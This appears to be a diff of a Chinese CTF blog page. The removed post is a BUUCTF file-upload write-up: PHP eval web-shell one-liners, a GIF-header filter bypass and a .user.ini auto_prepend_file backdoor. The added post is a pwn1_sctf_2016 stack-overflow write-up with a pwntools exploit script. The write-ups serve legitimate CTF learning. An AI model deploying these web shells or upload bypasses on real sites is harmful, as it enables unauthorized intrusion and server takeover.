@@ -4,14 +4,9 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="BUUCTF CheckIn, L">
-    <meta name="description" content="打开环境，是一个文件上传页面
-
-先查看一下源代码，看看有没有客户端校验显然没有客户端校验首先上传一个图片，检查上传功能图片正常上传接下来再上传一个php文件
-&amp;lt;?php 
-@eval($_POST[&#39;shell&#39;]);
- ?&gt;
-提示非">
+    <meta name="keywords" content="BUUCTF pwn1_sctf_2016, L">
+    <meta name="description" content="checksec32位程序，开启栈不可执行IDA分析，vuln函数和后门函数
+vuln函数看起来很大一坨，实际上都是C++的一些东西，函数的真正意思其实就是把I替换成you执行程序试一试如我们所想一样再看向缓冲区gets允许输入32个字节，">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -19,7 +14,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>BUUCTF CheckIn | L</title>
+    <title>BUUCTF pwn1_sctf_2016 | L</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -252,7 +247,7 @@
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">BUUCTF CheckIn</h1>
+                    <h1 class="description center-align post-title">BUUCTF pwn1_sctf_2016</h1>
                 </div>
             </div>
         </div>
@@ -369,12 +364,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/LawlietLW.github.io/tags/Web/">
-                                <span class="chip bg-color">Web</span>
+                            <a href="/LawlietLW.github.io/tags/pwn/">
+                                <span class="chip bg-color">pwn</span>
                             </a>
                         
-                            <a href="/LawlietLW.github.io/tags/user-ini%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%EF%BC%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
-                                <span class="chip bg-color">.user.ini文件的利用，文件上传</span>
+                            <a href="/LawlietLW.github.io/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/">
+                                <span class="chip bg-color">栈溢出</span>
                             </a>
                         
                     </div>
@@ -398,28 +393,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-12-23
+                    2020-01-30
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-01-23
+                    2020-01-30
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    711
+                    285
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    1 分
                 </div>
                 
 
@@ -435,28 +430,19 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>打开环境，是一个文件上传页面<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/1.jpg" alt=""></p>
-<a id="more"></a>
-<p>先查看一下源代码，看看有没有客户端校验<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/7.jpg" alt=""><br>显然没有客户端校验<br>首先上传一个图片，检查上传功能<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/2.jpg" alt=""><br>图片正常上传<br>接下来再上传一个php文件</p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> 
-@<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
- <span class="token delimiter">?></span></code></pre>
-<p><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/3.jpg" alt=""><br>提示非法后缀<br>那么应该是不能接受php后缀的文件了，我们把后缀改成jpg试一下<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/8.jpg" alt=""><br>我把content-type字段和后缀名都改了一下<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/9.jpg" alt=""><br>但依然无法上传，提示检测到了非法字符<br>那我们再把一句话换一种写法</p>
-<pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>php<span class="token punctuation">'</span></span><span class="token punctuation">></span></span></span> 
-@<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span></code></pre>
-<p>继续上传<br>得到了这样的反馈<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/10.jpg" alt=""></p>
-<pre class=" language-bash"><code class="language-bash">exif_imagetype<span class="token punctuation">(</span><span class="token punctuation">)</span> 读取一个图像的第一个字节并检查其签名。</code></pre>
-<p>这里是有文件内容头校验<br>不同的图片形式的文件头如下</p>
-<pre class=" language-bash"><code class="language-bash">JPG ：FF D8 FF E0 00 10 4A 46 49 46
-GIF<span class="token punctuation">(</span>相当于文本的GIF89a<span class="token punctuation">)</span>：47 49 46 38 39 61
-PNG： 89 50 4E 47</code></pre>
-<p>给我们的shell加上GIF文件的文件头，继续上传<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/11.jpg" alt=""><br>上传成功<br>但上传成功了该如何利用呢，图片马需要有文件包含漏洞或者解析漏洞才能够利用，但这道题并没有相应的漏洞<br>接下来就是我从这道题里面学到的新姿势了<br>先贴上P牛的链接<br><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html" target="_blank" rel="noopener">.user.ini文件构成的PHP后门</a></p>
-<p>php.ini是php默认的配置文件，其中包括了很多php的配置<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/12.jpg" alt=""><br>而.user.ini实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置<br>而且，和php.ini不同的是，.user.ini是一个能被动态加载的ini文件<br>所以，我们能轻易地用.user.ini文件构造出一个PHP后门<br>Php配置项中有两个比较有意思的项<br>auto_append_file、auto_prepend_file<br>其中auto_prepend_file指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数<br>auto_append_file则是在文件后面包含<br>也就是说，.user.ini文件相当于创造了文件包含的机会<br>用法也简单，直接写入.user.ini文件即可</p>
-<p>所以，本题中，我们只需要先创建一个.user.ini文件<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/13.jpg" alt=""><br>同样需要在.user.ini文件前加入GIF文件头<br>再创建一个图片马<br>可以使用copy命令</p>
-<pre class=" language-bash"><code class="language-bash">copy shell.jpg/b+shell.php/a shell.jpg</code></pre>
-<p>也可以使用一个叫edjpgcom的工具来生成图片马</p>
-<p>首先上传我们的.user.ini文件<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/14.jpg" alt=""><br>然后上传图片马<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/15.jpg" alt=""><br>访问一下上传的位置<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/16.jpg" alt=""><br>蚁剑连接<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/17.jpg" alt=""><br>成功拿到flag</p>
+                <p>checksec<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/1.jpg" alt=""><br>32位程序，开启栈不可执行<br>IDA分析，vuln函数和后门函数<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/2.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/3.jpg" alt=""></p>
+<p>vuln函数看起来很大一坨，实际上都是C++的一些东西，函数的真正意思其实就是把I替换成you<br>执行程序试一试<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/4.jpg" alt=""><br>如我们所想一样<br>再看向缓冲区<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/5.jpg" alt=""><br>gets允许输入32个字节，而s的缓冲区多达3C个字节，也就是相对于ebp有60个字节，则相对于eip有64个字节，正常输入的话无法造成缓冲区溢出<br>但结合程序会把’I’替换成’you’的效果来看，只要我们输入21个’I’，经过三倍字节替换后就会变成63个字节，再加上一个字节就能造成缓冲区溢出<br>所以可以写出exp如下</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+<span class="token comment" spellcheck="true">#io = process('./pwn1_sctf_2016')</span>
+io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26405</span><span class="token punctuation">)</span>
+get_flag_addr <span class="token operator">=</span> <span class="token number">0x08048f0d</span>
+payload <span class="token operator">=</span> <span class="token string">'I'</span><span class="token operator">*</span><span class="token number">20</span>
+payload <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">4</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>get_flag_addr<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p><img src="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/5.jpg" alt=""><br>成功读取flag</p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -500,7 +486,7 @@ PNG： 89 50 4E 47</code></pre>
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://LawlietLW.github.io/LawlietLW.github.io/2019/12/23/buuctf-checkin/">http://LawlietLW.github.io/LawlietLW.github.io/2019/12/23/buuctf-checkin/</a>
+                    <a href="http://LawlietLW.github.io/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/">http://LawlietLW.github.io/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -538,12 +524,12 @@ PNG： 89 50 4E 47</code></pre>
                     
                         <div class="article-tag">
                             
-                                <a href="/LawlietLW.github.io/tags/Web/">
-                                    <span class="chip bg-color">Web</span>
+                                <a href="/LawlietLW.github.io/tags/pwn/">
+                                    <span class="chip bg-color">pwn</span>
                                 </a>
                             
-                                <a href="/LawlietLW.github.io/tags/user-ini%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%EF%BC%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
-                                    <span class="chip bg-color">.user.ini文件的利用，文件上传</span>
+                                <a href="/LawlietLW.github.io/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/">
+                                    <span class="chip bg-color">栈溢出</span>
                                 </a>
                             
                         </div>
@@ -589,7 +575,7 @@ PNG： 89 50 4E 47</code></pre>
         repo: '',
         owner: '',
         admin: null,
-        id: '2019-12-23T21-39-49',
+        id: '2020-01-30T18-14-45',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -610,32 +596,88 @@ PNG： 89 50 4E 47</code></pre>
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/LawlietLW.github.io/2020/01/23/buuctf-rip/">
+                <a href="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="BUUCTF rip">
+                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="BUUCTF pwn1_sctf_2016">
                         
-                        <span class="card-title">BUUCTF rip</span>
+                        <span class="card-title">BUUCTF pwn1_sctf_2016</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            入门栈溢出题目，首先checksec一下64位程序，没有任何保护
-
-拖入IDA查看,F5大法好首先是main函数还有一个后门函数fun()很明显,main函数中的gets存在溢出,接下来来确定溢出字节数相对于EIP有23个字节exp如下
-f
+                            checksec32位程序，开启栈不可执行IDA分析，vuln函数和后门函数
+vuln函数看起来很大一坨，实际上都是C++的一些东西，函数的真正意思其实就是把I替换成you执行程序试一试如我们所想一样再看向缓冲区gets允许输入32个字节，
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-01-23
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-01-30
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/LawlietLW.github.io/categories/CTF/" class="post-category">
+                                    CTF
+                                </a>
+                            
+                            
                         </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/LawlietLW.github.io/tags/pwn/">
+                        <span class="chip bg-color">pwn</span>
+                    </a>
+                    
+                    <a href="/LawlietLW.github.io/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/">
+                        <span class="chip bg-color">栈溢出</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/LawlietLW.github.io/2020/01/30/buuctf-warmup-csaw-2016/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="BUUCTF warmup_csaw_2016">
+                        
+                        <span class="card-title">BUUCTF warmup_csaw_2016</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            checksec64位程序，没有保护拖入IDA查看,F5大法同样有一个后门函数，这个后门函数直接读取flag所以做法和rip一样直接贴exp
+from pwn import *
+
+#io = process('./warmup_csaw_2
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-01-30
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -657,73 +699,6 @@ f
                     
                     <a href="/LawlietLW.github.io/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/">
                         <span class="chip bg-color">栈溢出</span>
-                    </a>
-                    
-                    <a href="/LawlietLW.github.io/tags/rip/">
-                        <span class="chip bg-color">rip</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/LawlietLW.github.io/2019/12/22/buuctf-easy-calc/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="BUUCTF Easy Calc">
-                        
-                        <span class="card-title">BUUCTF Easy Calc</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            打开环境
-
-查看源代码
-&lt;!--I've set up WAF to ensure security.-->
-&lt;script>
-    $('#calc').submit(function(){
-        $.ajax({
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2019-12-22
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/LawlietLW.github.io/categories/CTF/" class="post-category">
-                                    CTF
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/LawlietLW.github.io/tags/Web/">
-                        <span class="chip bg-color">Web</span>
-                    </a>
-                    
-                    <a href="/LawlietLW.github.io/tags/http%E8%B5%B0%E7%A7%81/">
-                        <span class="chip bg-color">http走私</span>
-                    </a>
-                    
-                    <a href="/LawlietLW.github.io/tags/PHP%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%A3%E6%9E%90%E7%89%B9%E6%80%A7/">
-                        <span class="chip bg-color">PHP的字符串解析特性</span>
                     </a>
                     
                 </div>
